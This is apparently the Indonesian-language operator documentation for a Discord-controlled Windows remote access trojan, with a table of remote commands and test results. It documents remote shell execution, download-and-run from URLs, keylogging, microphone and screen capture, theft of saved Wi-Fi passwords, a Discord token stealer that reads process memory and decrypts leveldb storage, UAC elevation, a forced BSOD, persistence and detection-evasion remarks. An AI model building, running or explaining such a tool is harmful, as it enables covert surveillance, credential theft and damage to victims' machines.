# Perintah payload PC

Format: `!a <verb> [args]`, `!<uuid> <verb>`, `!* <verb>` (semua mesin).
Balasan selalu diprefix `[a]`.

| verb | keterangan | hak |
|---|---|---|
| `info` / `sys` | host, user, os, cpu, ram, uptime, admin, pid, exe, cwd, lan ip | user |
| `ping` | waktu bolak-balik ke API Discord + kode HTTP | user |
| `sh <cmd>` | shell biasa, cwd persisten | user |
| `pow <cmd>` | PowerShell `-NoProfile -NonInteractive` | user |
| `cd` / `ls` | navigasi folder | user |
| `shot` | screenshot semua monitor → attachment PNG | user |
| `dl <path>` | tarik file (batas 24 MB, limit upload Discord) | user |
| `up <path>` | simpan lampiran ke path tujuan | user |
| `x <url> [args]` | unduh exe/msi lalu jalankan, pid dilaporkan | user |
| `clip [teks]` | baca / tulis clipboard | user |
| `keys on\|off\|dump` | keylogger polling `GetAsyncKeyState` | user |
| `ps` | `tasklist` CSV | user |
| `kill <pid>` | TerminateProcess | user |
| `taskkill <pid\|nama.exe>` | `taskkill /F`, bisa nama proses | user |
| `msg <teks>` | messagebox (blocking, thread sendiri) | user |
| `notify <teks>` | balloon tray, tidak blocking | user |
| `tts <teks>` | SAPI `System.Speech`, jalan di latar | user |
| `volume up\|down\|mute\|0-100` | tombol volume sistem; persen = pendekatan langkah 2% | user |
| `mic [detik]` | rekam mikrofon lewat MCI (winmm) → WAV, maks 120 s | user |
| `block on\|off` | `BlockInput`, mengunci keyboard+mouse | **admin** |
| `rick [url]` | form borderless topmost + WebBrowser, `rick off` menutup | user |
| `wifi` | semua profil tersimpan + password (`netsh wlan ... key=clear`) | user |
| `grab` | token Discord hidup: scan memori proses + leveldb, diverifikasi ke API | user |
| `power reboot\|shutdown\|logoff` | `shutdown /r|/s|/l /t 0 /f` | user |
| `admin` | `ShellExecuteW runas` → instance baru elevated (UAC) | user → admin |
| `bsod yes` | `NtRaiseHardError` dengan ResponseOption 6 → bugcheck | user |
| `persist` / `unpersist` | pasang / cabut autostart | user |
| `update` | ringkasan build yang jalan | user |
| `update <url> [sha256]` | unduh, verifikasi, timpa, relaunch | user |
| `update gh <owner>/<repo> [aset] [sha256]` | ambil aset rilis `latest` | user |
| `sleep <detik>` | jeda polling 1–3600 | user |
| `exit` | proses mati, autostart tetap | user |
| `purge` | hapus data + exe, keluar | user |

## Yang benar-benar terbukti jalan

Diuji di mesin ini (Windows 11, tanpa elevated):

```
wifi            9 profil terbaca, password ikut (WPA2-Personal)
mic 2 detik     WAV 21.843 B, device terbuka
grab            token hidup ditemukan dari memori Discord (27,8 s, tanpa admin)
                + leveldb 2.201 MB disisir, 3 kandidat, 2 ditolak API (401)
volume/power/taskkill/block  pesan usage + penolakan admin benar
tts / notify    PowerShell System.Speech & NotifyIcon tanpa error
```

`grab` punya tiga sumber, karena tiap versi Discord beda tempat menyimpan:

| sumber | cara | catatan |
|---|---|---|
| memori proses `Discord.exe` | `ReadProcessMemory` region readable, pola token | paling andal — token aktif selalu ada selama sesi jalan |
| leveldb `dQw4w9WgXcQ:` | base64 → `v10` + nonce + ct + tag | kunci dari `Local State` lewat DPAPI |
| leveldb plaintext | regex langsung | sisa instalasi lama |

Semua kandidat diverifikasi ke `GET /users/@me`; yang balik 401 dibuang, jadi
yang dilaporkan hanya token yang benar-benar masih punya sesi. Nomor token tetap
dimask (`MTA2MjI5ND...KbzkfE`) supaya tidak utuh di log channel.

AES-256-GCM-nya diuji dengan dua vektor NIST:
`#13` key 0x00… (1 blok) dan `#14` key `feffe992…`, IV `cafebabefacedbaddecaf888`
(tanpa AAD, 64 byte) — keduanya cocok, dan tag yang dirusak ditolak. AES-nya
juga diuji terpisah dengan FIPS-197 C.1 dan C.3.

Satu temuan jujur: di mesin ini blob `v10` di leveldb **tidak terbuka** dengan
kunci dari `Local State` — DPAPI-nya benar (round-trip lolos), tapi tag GCM
tetap ditolak. Dugaan paling masuk akal: nilai lama yang di-compact ulang
sesudah kunci berganti. Karena itu jalur memori dijadikan sumber utama, bukan
pelengkap.

## Batas yang harus diketahui

**`block` butuh admin.** Sejak Vista `BlockInput` menolak proses non-elevated.
Tanpa UAC hasilnya `[err] ditolak (butuh admin)`, bukan diam.

**`rick` memakai mesin IE.** `System.Windows.Forms.WebBrowser` adalah IE11, jadi
YouTube biasanya tidak main. Yang main: URL yang IE bisa buka (mis. `.mp4`
langsung). Ini keterbatasan komponen, bukan bug yang bisa ditambal tanpa
dependensi GUI tambahan.

**`grab` butuh sesi user yang sama.** Memori `Discord.exe` hanya bisa dibaca
oleh proses dengan integritas setara, jadi payload yang jalan sebagai user lain
(mis. SYSTEM lewat service) tidak akan menemukan apa pun. Jalur leveldb tetap
jalan tanpa admin karena DPAPI itu user-scoped, tapi hanya kalau kuncinya masih
cocok.

**`grab` makan waktu.** Menyisir memori sampai 2 GB butuh ~25 detik, jadi verb
ini dijalankan di thread sendiri: balasan pertama `jalan...`, hasilnya menyusul.
Tanpa itu satu `grab` menahan loop polling dan perintah lain ikut mengantre.

**`bsod` dijaga `yes`.** Tanpa argumen itu cuma membalas instruksi. Dengan
`bsod yes` mesin benar-benar bugcheck dan restart — semua yang belum disimpan
hilang.

**`volume 0-100` itu pendekatan.** Windows tidak menyediakan API absolut untuk
volume endpoint default tanpa COM `IAudioEndpointVolume`; yang dipakai tombol
volume sistem: turun 50 langkah lalu naik `pct/2` langkah.

**`keys` tetap polling.** `GetAsyncKeyState` menangkap tombol global, bukan
focus window, dan bisa ketinggalan input sangat cepat. Hook level kernel
(`SetWindowsHookEx`) akan lebih akurat tapi jauh lebih terdeteksi.
